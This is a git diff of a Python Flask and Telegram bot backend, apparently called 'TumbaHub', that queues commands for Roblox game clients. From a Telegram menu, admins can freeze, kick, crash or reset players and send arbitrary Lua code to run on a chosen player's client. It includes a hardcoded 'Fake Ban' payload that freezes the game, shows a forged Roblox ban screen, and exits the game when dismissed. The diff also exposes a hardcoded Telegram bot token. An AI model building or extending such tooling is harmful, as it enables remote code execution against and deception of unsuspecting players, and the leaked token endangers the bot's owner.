@@ -7,16 +7,21 @@ import os
 
 app = Flask(__name__)
 
-# Твои данные Телеграма
-# ВНИМАНИЕ: Вставь сюда НОВЫЙ токен от BotFather!
-TELEGRAM_TOKEN = os.getenv('8693862606:AAEvhj2EJeSxHhaw0JopIb_oK-COEZKix1g')
+# Telegram Bot Token
+TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN', '8693862606:AAEvhj2EJeSxHhaw0JopIb_oK-COEZKix1g')
 
-# Читаем админов: либо из среды (через запятую), либо дефолтный список
-# Замени 111111111 на ID твоего друга!
-env_admins = os.getenv('ALLOWED_ADMINS', '8426928414,1165708688') 
+# Admin IDs
+# FULL_ADMINS have access to everything, including Crash and Execute.
+# SEMI_ADMINS have access to most functions except the most dangerous ones.
+FULL_ADMINS_STR = os.getenv('FULL_ADMINS', '8426928414')
+SEMI_ADMINS_STR = os.getenv('SEMI_ADMINS', '1165708688')
 
-# Превращаем строку "ID1,ID2" в нормальный список чисел Python:
-ALLOWED_ADMINS = [int(admin_id.strip()) for admin_id in env_admins.split(',')]
+FULL_ADMINS = [int(admin_id.strip()) for admin_id in FULL_ADMINS_STR.split(',') if admin_id.strip()]
+SEMI_ADMINS = [int(admin_id.strip()) for admin_id in SEMI_ADMINS_STR.split(',') if admin_id.strip()]
+
+# The main chat where notifications about new players are sent.
+# Assumes the first full admin is the target for these notifications.
+TELEGRAM_CHAT_ID = FULL_ADMINS[0] if FULL_ADMINS else None
 
 # --- НАСТРОЙКИ GITHUB DB ---
 # ВНИМАНИЕ: Вставь сюда НОВЫЙ токен от GitHub!
@@ -158,44 +163,207 @@ def ping():
 @app.route('/api/get_command', methods=['GET'])
 def get_command():
     username = request.args.get('username')
-    
+
     if username in commands_queue and len(commands_queue[username]) > 0:
         cmd = commands_queue[username].pop(0) # Теперь мы достаем просто строку
         return jsonify({"status": "success", "command": cmd})
-    
+
     return jsonify({"status": "empty"})
 
 
 @app.route('/api/telegram_webhook', methods=['POST'])
 def telegram_webhook():
     update = request.json
-    
-    # === БЛОК 1: ОБРАБОТКА ТЕКСТА ===
-    if update and "message" in update and "text" in update["message"]:
-        chat_id = str(update["message"]["chat"]["id"])
-        text = update["message"]["text"]
-        
-        if chat_id == TELEGRAM_CHAT_ID:
-            # 1. ГЛАВНОЕ МЕНЮ
-            if text == "/menu":
+
+    user_id = None
+    chat_id = None
+    is_callback = "callback_query" in update
+
+    if is_callback:
+        callback = update["callback_query"]
+        user_id = callback["from"]["id"]
+        chat_id = callback["message"]["chat"]["id"]
+    elif "message" in update and "from" in update["message"]:
+        user_id = update["message"]["from"]["id"]
+        chat_id = update["message"]["chat"]["id"]
+
+    # 1. Authorization Check
+    if user_id not in FULL_ADMINS and user_id not in SEMI_ADMINS:
+        if chat_id:
+            send_telegram_message(chat_id, "⛔ Access Denied")
+        return "Access Denied", 403
+
+    is_full_admin = user_id in FULL_ADMINS
+
+    # --- Callback Query Handling ---
+    if is_callback:
+        callback = update["callback_query"]
+        data = callback["data"]
+        callback_id = callback["id"]
+
+        # 2. Main Menu Navigation
+        if data == "menu_games":
+            answer_callback(callback_id, "Раздел Игры пока пуст!", show_alert=True)
+            return jsonify({"status": "ok"})
+            
+        elif data == "menu_players":
+            # 3. Player List
+            if not commands_queue:
+                send_telegram_message(chat_id, "⚠️ В базе пока нет игроков.")
+            else:
+                player_buttons = []
+                current_time = time.time()
+                for player in sorted(commands_queue.keys()):
+                    status_icon = "🔴"
+                    if player in last_seen and (current_time - last_seen.get(player, 0) < 45):
+                        status_icon = "🟢"
+                    player_buttons.append([{"text": f"{status_icon} {player}", "callback_data": f"playerprof_{player}"}])
+                
+                keyboard = {"inline_keyboard": player_buttons}
+                send_telegram_message(
+                    chat_id, 
+                    "👥 **Список игроков:**\nВыберите для управления:",
+                    reply_markup=keyboard,
+                    parse_mode="Markdown"
+                )
+            answer_callback(callback_id)
+            return jsonify({"status": "ok"})
+
+        # --- Player-specific actions ---
+        parts = data.split('_', 1)
+        if len(parts) == 2:
+            btn_action, target_user = parts
+            
+            # 4. Player Profile
+            if btn_action == "playerprof":
+                # Clear awaiting states for this admin
+                awaiting_reason.pop(user_id, None)
+                awaiting_execute.pop(user_id, None)
+                awaiting_msg_text.pop(user_id, None)
+                awaiting_msg_duration.pop(user_id, None)
+
+                # Base keyboard for all admins
+                keyboard_layout = [
+                    [{"text": "💬 Message", "callback_data": f"message_{target_user}"}],
+                    [{"text": "🧊 Freeze", "callback_data": f"freeze_{target_user}"}, {"text": "🏃 Unfreeze", "callback_data": f"unfreeze_{target_user}"}],
+                    [{"text": "🥾 Kick", "callback_data": f"kick_{target_user}"}, {"text": "💀 Reset", "callback_data": f"reset_{target_user}"}],
+                ]
+                
+                # Add full admin buttons
+                if is_full_admin:
+                    keyboard_layout.insert(1, [{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}])
+                    keyboard_layout[3].append({"text": "💥 Crash", "callback_data": f"crash_{target_user}"})
+
+                keyboard_layout.append([{"text": "🔙 Назад", "callback_data": "menu_players"}])
+                
+                keyboard = {"inline_keyboard": keyboard_layout}
+                send_telegram_message(
+                    chat_id, 
+                    f"👤 **Профиль: {target_user}**\nЧто будем делать?", 
+                    reply_markup=keyboard,
+                    parse_mode="Markdown"
+                )
+
+            # 5. Action Button Handling
+            elif btn_action in ["freeze", "unfreeze", "reset"]:
+                action = f"/{btn_action}"
+                if target_user not in commands_queue: commands_queue[target_user] = []
+                commands_queue[target_user].append(action)
+                answer_callback(callback_id, f"✅ Команда {action} отправлена {target_user}")
+
+            elif btn_action == "crash":
+                if not is_full_admin:
+                    answer_callback(callback_id, "⛔ Недостаточно прав!", show_alert=True)
+                    return jsonify({"status": "permission_denied"})
+                
+                action = "/crash"
+                if target_user not in commands_queue: commands_queue[target_user] = []
+                commands_queue[target_user].append(action)
+                answer_callback(callback_id, f"💥 Краш отправлен {target_user}")
+
+            elif btn_action == "execselect":
+                if not is_full_admin:
+                    answer_callback(callback_id, "⛔ Недостаточно прав!", show_alert=True)
+                    return jsonify({"status": "permission_denied"})
+                
+                awaiting_execute[user_id] = target_user
+                send_telegram_message(chat_id, f"✍️ Отправь мне Lua-код для выполнения на клиенте **{target_user}**:", parse_mode="Markdown")
+            
+            elif btn_action == "message":
+                awaiting_msg_text[user_id] = target_user
+                send_telegram_message(chat_id, f"✍️ Отправь мне текст сообщения для игрока **{target_user}**:", parse_mode="Markdown")
+
+            # 6. Kick Handling
+            elif btn_action == "kick":
+                awaiting_reason[user_id] = target_user
                 keyboard = {
                     "inline_keyboard": [
-                        [{"text": "👥 Игроки", "callback_data": "menu_players"}],
-                        [{"text": "🎮 Игры", "callback_data": "menu_games"}]
+                        [{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}],
+                        [{"text": "⛔ Fake Ban (Error 600)", "callback_data": f"fakeban_{target_user}"}]
                     ]
                 }
-                send_telegram_message(TELEGRAM_CHAT_ID, "🎛 **Главное меню TumbaHub**\nВыберите раздел:", reply_markup=keyboard, parse_mode="Markdown")
-                return jsonify({"status": "ok"})
+                send_telegram_message(chat_id, f"Напиши причину кика для {target_user} или выбери шаблон:", reply_markup=keyboard)
 
-            # 2. ЕСЛИ БОТ ЖДЕТ ДЛИТЕЛЬНОСТЬ СООБЩЕНИЯ
-            if chat_id in awaiting_msg_duration:
-                try:
-                    duration = int(text)
-                    data = awaiting_msg_duration.pop(chat_id)
-                    target_user = data["user"]
-                    msg_text = data["text"]
+            elif btn_action == "defaultkick":
+                awaiting_reason.pop(user_id, None)
+                action = "/kick"
+                if target_user not in commands_queue: commands_queue[target_user] = []
+                commands_queue[target_user].append(action)
+                answer_callback(callback_id, f"✅ {target_user} кикнут (дефолт).")
 
-                    lua_code = f"""
+            elif btn_action == "fakeban":
+                awaiting_reason.pop(user_id, None)
+                lua_code = "task.spawn(function() local s repeat s=pcall(function() game:GetService('StarterGui'):SetCoreGuiEnabled(Enum.CoreGuiType.All,false) end) task.wait() until s end);local c=workspace.CurrentCamera;c.CameraType=Enum.CameraType.Scriptable;c.CFrame=c.CFrame;for _,v in pairs(workspace:GetDescendants())do if v:IsA('BasePart')and not v.Anchored then v.Anchored=true end if v:IsA('Humanoid')or v:IsA('AnimationController')then for _,t in pairs(v:GetPlayingAnimationTracks())do t:AdjustSpeed(0)end end end;game:GetService('RunService').RenderStepped:Connect(function() for _,p in pairs(game.Players:GetPlayers())do if p.Character then for _,pt in pairs(p.Character:GetDescendants())do if pt:IsA('BasePart')then pt.Anchored=true end end end end end);local b=Instance.new('BlurEffect',game:GetService('Lighting'));b.Size=24;pcall(function() game:GetService('SoundService').AmbientReverb=Enum.ReverbType.NoReverb;for _,s in pairs(game:GetDescendants())do if s:IsA('Sound')then s:Stop()end end end);local sg=Instance.new('ScreenGui',game.Players.LocalPlayer:WaitForChild('PlayerGui'));sg.Name='RobloxJoinErrorUI';sg.IgnoreGuiInset=true;sg.DisplayOrder=999999;sg.ResetOnSpawn=false;local bg=Instance.new('Frame',sg);bg.Size=UDim2.new(1,0,1,0);bg.BackgroundColor3=Color3.new(0,0,0);bg.BackgroundTransparency=0.5;bg.Active=true;local mf=Instance.new('Frame',bg);mf.Size=UDim2.new(0,400,0,290);mf.Position=UDim2.new(0.5,0,0.5,0);mf.AnchorPoint=Vector2.new(0.5,0.5);mf.BackgroundColor3=Color3.fromRGB(65,65,65);mf.BorderSizePixel=0;local pd=Instance.new('UIPadding',mf);pd.PaddingLeft=UDim.new(0,24);pd.PaddingRight=UDim.new(0,24);pd.PaddingTop=UDim.new(0,20);pd.PaddingBottom=UDim.new(0,24);local tl=Instance.new('TextLabel',mf);tl.Size=UDim2.new(1,0,0,24);tl.BackgroundTransparency=1;tl.Text='Join Error';tl.TextColor3=Color3.new(1,1,1);tl.Font=Enum.Font.GothamBold;tl.TextSize=19;local dv=Instance.new('Frame',mf);dv.Size=UDim2.new(1,0,0,1);dv.Position=UDim2.new(0,0,0,36);dv.BackgroundColor3=Color3.fromRGB(215,215,215);dv.BorderSizePixel=0;local ml=Instance.new('TextLabel',mf);ml.Size=UDim2.new(1,0,0,180);ml.Position=UDim2.new(0,0,0,52);ml.BackgroundTransparency=1;ml.Text='You were banned by this experience or its\\nmoderators. Moderation message:\\n\\nYou have been temporarily banned.\\n        [Remaining ban duration: 4960 weeks 2\\ndays 5 hours 19 minutes 52 seconds ]\\n(Error Code: 600)\\n\\n';ml.TextColor3=Color3.fromRGB(210,210,210);ml.Font=Enum.Font.Gotham;ml.TextSize=16;ml.LineHeight=1.18;ml.TextWrapped=true;ml.TextXAlignment=Enum.TextXAlignment.Center;ml.TextYAlignment=Enum.TextYAlignment.Top;local lb=Instance.new('TextButton',mf);lb.Size=UDim2.new(1,0,0,36);lb.Position=UDim2.new(0,0,1,-36);lb.BackgroundColor3=Color3.new(1,1,1);lb.BorderSizePixel=0;lb.Text='Leave';lb.TextColor3=Color3.new(0,0,0);lb.Font=Enum.Font.GothamMedium;lb.TextSize=16;lb.AutoButtonColor=false;Instance.new('UICorner',lb).CornerRadius=UDim.new(0,6);lb.MouseButton1Click:Connect(function() game:Shutdown() end);game:GetService('GuiService').SelectedCoreObject=nil;"
+                action = f"/execute__{lua_code}"
+                if target_user not in commands_queue: commands_queue[target_user] = []
+                commands_queue[target_user].append(action)
+                answer_callback(callback_id, f"✅ {target_user} отлетел с экраном Fake Ban (Error 600)!", show_alert=True)
+                
+            # Always answer the callback to remove the loading icon
+            answer_callback(callback_id)
+
+    # --- Text Message Handling ---
+    elif "message" in update and "text" in update["message"]:
+        text = update["message"]["text"]
+
+        # 2. Main Menu Command
+        if text == "/menu":
+            keyboard = {
+                "inline_keyboard": [
+                    [{"text": "👥 Игроки", "callback_data": "menu_players"}],
+                    [{"text": "🎮 Игры", "callback_data": "menu_games"}]
+                ]
+            }
+            send_telegram_message(chat_id, "🎛 **Главное меню TumbaHub**\nВыберите раздел:", reply_markup=keyboard, parse_mode="Markdown")
+        
+        # Awaiting states
+        elif user_id in awaiting_reason:
+            target_user = awaiting_reason.pop(user_id)
+            action = f"/kick_{text}"
+            if target_user not in commands_queue: commands_queue[target_user] = []
+            commands_queue[target_user].append(action)
+            send_telegram_message(chat_id, f"✅ {target_user} кикнут с причиной:\n💬 {text}")
+
+        elif user_id in awaiting_execute:
+            target_user = awaiting_execute.pop(user_id)
+            action = f"/execute__{text}"
+            if target_user not in commands_queue: commands_queue[target_user] = []
+            commands_queue[target_user].append(action)
+            send_telegram_message(chat_id, f"✅ Скрипт успешно отправлен в очередь игрока {target_user}!")
+
+        elif user_id in awaiting_msg_text:
+            target_user = awaiting_msg_text.pop(user_id)
+            awaiting_msg_duration[user_id] = {"user": target_user, "text": text}
+            send_telegram_message(chat_id, f"💬 Сообщение: '{text}'.\n\nТеперь отправь длительность сообщения в секундах (например, 10).")
+
+        elif user_id in awaiting_msg_duration:
+            try:
+                duration = int(text)
+                data = awaiting_msg_duration.pop(user_id)
+                target_user = data["user"]
+                msg_text = data["text"]
+
+                lua_code = f"""
 local gui = Instance.new("ScreenGui", game.CoreGui)
 gui.DisplayOrder = 999
 local label = Instance.new("TextLabel", gui)
@@ -211,278 +379,12 @@ label.TextWrapped = true
 label.Text = "{msg_text}"
 game:GetService("Debris"):AddItem(gui, {duration})
 """
-                    action = f"/execute__{lua_code}"
-                    if target_user not in commands_queue: commands_queue[target_user] = []
-                    commands_queue[target_user].append(action)
-                    send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Сообщение '{msg_text}' на {duration} сек. отправлено игроку {target_user}!")
-                except ValueError:
-                    send_telegram_message(TELEGRAM_CHAT_ID, "⚠️ Ошибка: Введите число. Попробуйте снова.")
-                return jsonify({"status": "ok"})
-
-            # 3. ЕСЛИ БОТ ЖДЕТ ТЕКСТ СООБЩЕНИЯ
-            if chat_id in awaiting_msg_text:
-                target_user = awaiting_msg_text.pop(chat_id)
-                awaiting_msg_duration[chat_id] = {"user": target_user, "text": text}
-                send_telegram_message(TELEGRAM_CHAT_ID, f"💬 Сообщение: '{text}'.\n\nТеперь отправь длительность сообщения в секундах (например, 10).")
-                return jsonify({"status": "ok"})
-
-            # 4. ЕСЛИ БОТ ЖДЕТ СКРИПТ (Execute)
-            if chat_id in awaiting_execute:
-                target_user = awaiting_execute.pop(chat_id)
-                action = f"/execute__{text}"
-                
-                if target_user not in commands_queue:
-                    commands_queue[target_user] = []
+                action = f"/execute__{lua_code}"
+                if target_user not in commands_queue: commands_queue[target_user] = []
                 commands_queue[target_user].append(action)
-                
-                send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Скрипт успешно отправлен в очередь игрока {target_user}!")
-                return jsonify({"status": "ok"})
-
-            # 5. ЕСЛИ БОТ ЖДЕТ ПРИЧИНУ КИКА
-            if chat_id in awaiting_reason:
-                target_user = awaiting_reason.pop(chat_id)
-                action = f"/kick_{text}"
-                
-                if target_user not in commands_queue:
-                    commands_queue[target_user] = []
-                commands_queue[target_user].append(action)
-                
-                send_telegram_message(TELEGRAM_CHAT_ID, f"✅ {target_user} кикнут с причиной:\n💬 {text}")
-                return jsonify({"status": "ok"})
-
-            # 6. РУЧНОЙ ВВОД КОМАНД (через пробелы)
-            parts = text.split(' ', 2)
-            if len(parts) >= 2:
-                base_cmd = parts[0]
-                target_user = parts[1]
-                
-                if base_cmd == "/kick" and len(parts) == 3:
-                    action = f"/kick_{parts[2]}" 
-                elif base_cmd == "/execute" and len(parts) == 3:
-                    action = f"/execute__{parts[2]}"
-                else:
-                    action = base_cmd
-                
-                if target_user not in commands_queue:
-                    commands_queue[target_user] = []
-                commands_queue[target_user].append(action)
-                send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Ручная команда отправлена {target_user}")
-
-    # === БЛОК 2: ОБРАБОТКА КНОПОК ===
-    if update and "callback_query" in update:
-        callback = update["callback_query"]
-        chat_id = str(callback["message"]["chat"]["id"])
-        data = callback["data"]
-        callback_id = callback["id"]
-        
-        if chat_id == TELEGRAM_CHAT_ID:
-            
-            # === ГЛОБАЛЬНЫЕ КНОПКИ ===
-            if data == "menu_games":
-                requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
-                    json={"callback_query_id": callback_id, "text": "Раздел Игры пока пуст!", "show_alert": True}
-                )
-                return jsonify({"status": "ok"})
-                
-            elif data == "menu_players":
-                if len(commands_queue) == 0:
-                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": "⚠️ В базе пока нет игроков."})
-                else:
-                    player_buttons = []
-                    current_time = time.time()
-                    for player in commands_queue.keys():
-                        if player in last_seen and (current_time - last_seen[player] < 45):
-                            status_icon = "🟢"
-                        else:
-                            status_icon = "🔴"
-                            
-                        player_buttons.append([{"text": f"{status_icon} {player}", "callback_data": f"playerprof_{player}"}])
-                    
-                    keyboard = {"inline_keyboard": player_buttons}
-                    requests.post(
-                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                        json={
-                            "chat_id": TELEGRAM_CHAT_ID, 
-                            "text": "👥 **Список активных игроков:**\nВыберите кого-нибудь для управления:",
-                            "reply_markup": keyboard,
-                            "parse_mode": "Markdown"
-                        }
-                    )
-                requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json={"callback_query_id": callback_id})
-                return jsonify({"status": "ok"})
-
-            # === ЛОКАЛЬНЫЕ КНОПКИ (С НИКОМ) ===
-            parts = data.split('_', 1)
-            if len(parts) == 2:
-                btn_action = parts[0]
-                target_user = parts[1]
-                
-                # --- ОТКРЫТИЕ ПРОФИЛЯ ---
-                if btn_action == "playerprof":
-                    # Очищаем все ожидания для этого чата
-                    if chat_id in awaiting_execute: del awaiting_execute[chat_id]
-                    if chat_id in awaiting_reason: del awaiting_reason[chat_id]
-                    if chat_id in awaiting_msg_text: del awaiting_msg_text[chat_id]
-                    if chat_id in awaiting_msg_duration: del awaiting_msg_duration[chat_id]
-
-                    keyboard = {
-                        "inline_keyboard": [
-                            [{"text": "💬 Message", "callback_data": f"message_{target_user}"}],
-                            [{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}],
-                            [{"text": "🧊 Freeze", "callback_data": f"freeze_{target_user}"}, {"text": "🏃 Unfreeze", "callback_data": f"unfreeze_{target_user}"}],
-                            [{"text": "🥾 Kick", "callback_data": f"kick_{target_user}"}, {"text": "💥 Crash", "callback_data": f"crash_{target_user}"}],
-                            [{"text": "💀 Reset", "callback_data": f"reset_{target_user}"}],
-                            [{"text": "🔙 Назад", "callback_data": "menu_players"}]
-                        ]
-                    }
-                    requests.post(
-                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                        json={
-                            "chat_id": TELEGRAM_CHAT_ID, 
-                            "text": f"👤 **Профиль: {target_user}**\nЧто будем делать с этим игроком?", 
-                            "reply_markup": keyboard,
-                            "parse_mode": "Markdown"
-                        }
-                    )
-                
-                # --- ОТПРАВКА СООБЩЕНИЯ ---
-                elif btn_action == "message":
-                    awaiting_msg_text[chat_id] = target_user
-                    send_telegram_message(TELEGRAM_CHAT_ID, f"✍️ Отправь мне текст сообщения для игрока **{target_user}**:", parse_mode="Markdown")
-
-                # --- ВЫПОЛНЕНИЕ СКРИПТА ---
-                elif btn_action == "execselect":
-                    awaiting_execute[chat_id] = target_user
-                    requests.post(
-                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✍️ Отправь мне Lua-код для выполнения на клиенте **{target_user}**:", "parse_mode": "Markdown"}
-                    )
-                
-                # --- КИК ---
-                elif btn_action == "kick":
-                    awaiting_reason[chat_id] = target_user
-                    keyboard = {
-                        "inline_keyboard": [
-                            [{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}],
-                            [{"text": "⛔ Fake Ban (4960 weeks)", "callback_data": f"fakeban_{target_user}"}]
-                        ]
-                    }
-                    requests.post(
-                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"Напиши причину кика для {target_user} или выбери шаблон ниже:", "reply_markup": keyboard}
-                    )
-                
-                elif btn_action == "defaultkick":
-                    if chat_id in awaiting_reason:
-                        del awaiting_reason[chat_id]
-                    action = "/kick"
-                    if target_user not in commands_queue: commands_queue[target_user] = []
-                    commands_queue[target_user].append(action)
-                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} кикнут (дефолт)."})
-                    
-                # --- ФЕЙК БАН (ТРОЛЛИНГ) ---
-                elif btn_action == "fakeban":
-                    if chat_id in awaiting_reason:
-                        del awaiting_reason[chat_id]
-                        
-                    lua_code = """
-pcall(function()
-    for _, v in pairs(workspace:GetDescendants()) do
-        if v:IsA("BasePart") then v.Anchored = true end
-    end
-    local char = game.Players.LocalPlayer.Character
-    if char then
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        local animCtrl = char:FindFirstChildOfClass("AnimationController")
-        if hum then
-            for _, track in pairs(hum:GetPlayingAnimationTracks()) do track:AdjustSpeed(0) end
-        end
-        if animCtrl then
-            for _, track in pairs(animCtrl:GetPlayingAnimationTracks()) do track:AdjustSpeed(0) end
-        end
-    end
-    local blur = Instance.new("BlurEffect", game.Lighting)
-    blur.Size = 24
-    local sg = Instance.new("ScreenGui", game.CoreGui)
-    sg.IgnoreGuiInset = true
-    sg.DisplayOrder = 99999
-    local bg = Instance.new("Frame", sg)
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    bg.BackgroundTransparency = 0.2
-    local modal = Instance.new("Frame", bg)
-    modal.Size = UDim2.new(0, 400, 0, 200)
-    modal.Position = UDim2.new(0.5, -200, 0.5, -100)
-    modal.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    modal.BorderSizePixel = 0
-    local title = Instance.new("TextLabel", modal)
-    title.Size = UDim2.new(1, 0, 0, 40)
-    title.BackgroundTransparency = 1
-    title.Text = "Disconnected"
-    title.TextColor3 = Color3.new(1, 1, 1)
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 24
-    local msg = Instance.new("TextLabel", modal)
-    msg.Size = UDim2.new(1, -40, 1, -100)
-    msg.Position = UDim2.new(0, 20, 0, 40)
-    msg.BackgroundTransparency = 1
-    msg.Text = "You have been temporarily banned.\\n[Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes 59 seconds ]\\n(Error Code: 600)"
-    msg.TextColor3 = Color3.fromRGB(200, 200, 200)
-    msg.Font = Enum.Font.SourceSans
-    msg.TextSize = 18
-    msg.TextWrapped = true
-    local btn = Instance.new("TextButton", modal)
-    btn.Size = UDim2.new(0, 150, 0, 40)
-    btn.Position = UDim2.new(0.5, -75, 1, -50)
-    btn.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
-    btn.Text = "Leave"
-    btn.TextColor3 = Color3.new(0, 0, 0)
-    btn.Font = Enum.Font.SourceSansBold
-    btn.TextSize = 20
-    btn.MouseButton1Click:Connect(function() game.Players.LocalPlayer:Kick("Left the game") end)
-end)
-"""
-                    action = f"/execute__{lua_code.strip()}"
-                    
-                    if target_user not in commands_queue: 
-                        commands_queue[target_user] = []
-                    commands_queue[target_user].append(action)
-                    
-                    requests.post(
-                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} отлетел с экраном Fake Ban (Error 600)!"}
-                    )
-                    
-                # --- КРАШ ---
-                elif btn_action == "crash":
-                    action = "/crash"
-                    if target_user not in commands_queue: commands_queue[target_user] = []
-                    commands_queue[target_user].append(action)
-                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💥 Краш отправлен {target_user}"})
-                
-                # --- РЕСЕТ ---
-                elif btn_action == "reset":
-                    action = "/reset"
-                    if target_user not in commands_queue: commands_queue[target_user] = []
-                    commands_queue[target_user].append(action)
-                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💀 Команда сброса (Reset) отправлена {target_user}"})
-                
-                # --- ЗАМОРОЗКА ---
-                elif btn_action == "freeze":
-                    action = "/freeze"
-                    if target_user not in commands_queue: commands_queue[target_user] = []
-                    commands_queue[target_user].append(action)
-                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🧊 Команда Freeze (Заморозка) отправлена {target_user}"})
-                
-                # --- РАЗМОРОЗКА ---
-                elif btn_action == "unfreeze":
-                    action = "/unfreeze"
-                    if target_user not in commands_queue: commands_queue[target_user] = []
-                    commands_queue[target_user].append(action)
-                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🏃 Команда Unfreeze (Разморозка) отправлена {target_user}"})
-                
-            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json={"callback_query_id": callback_id})
+                send_telegram_message(chat_id, f"✅ Сообщение '{msg_text}' на {duration} сек. отправлено игроку {target_user}!")
+            except ValueError:
+                send_telegram_message(chat_id, "⚠️ Ошибка: Введите число. Попробуйте снова.")
 
     return jsonify({"status": "ok"})
 
